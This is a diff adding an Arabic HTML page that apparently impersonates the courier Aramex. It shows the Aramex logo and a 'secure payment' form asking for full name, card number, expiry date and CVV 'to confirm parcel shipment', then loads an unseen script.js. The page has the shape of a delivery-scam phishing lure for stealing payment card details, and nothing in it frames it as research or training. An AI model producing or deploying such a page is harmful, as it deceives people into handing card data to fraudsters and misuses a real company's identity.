@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>أرامكس - الدفع الآمن</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <img src="images/aramex-logo.png" alt="Aramex Logo" class="logo">
+        <h1>الدفع الآمن</h1>
+        <p>يرجى إدخال تفاصيل الدفع الخاصة بك لتأكيد شحن الطرد.</p>
+        <form id="payment-form">
+            <label for="name">الاسم الكامل:</label>
+            <input type="text" id="name" name="name" required>
+            <label for="card_number">رقم البطاقة:</label>
+            <input type="text" id="card_number" name="card_number" required>
+            <label for="expiry_date">تاريخ الانتهاء:</label>
+            <input type="text" id="expiry_date" name="expiry_date" required>
+            <label for="cvv">رمز الأمان:</label>
+            <input type="text" id="cvv" name="cvv" required>
+            <button type="submit">ادفع الآن</button>
+        </form>
+    </div>
+    <script src="script.js"></script>
+</body>
+</html>
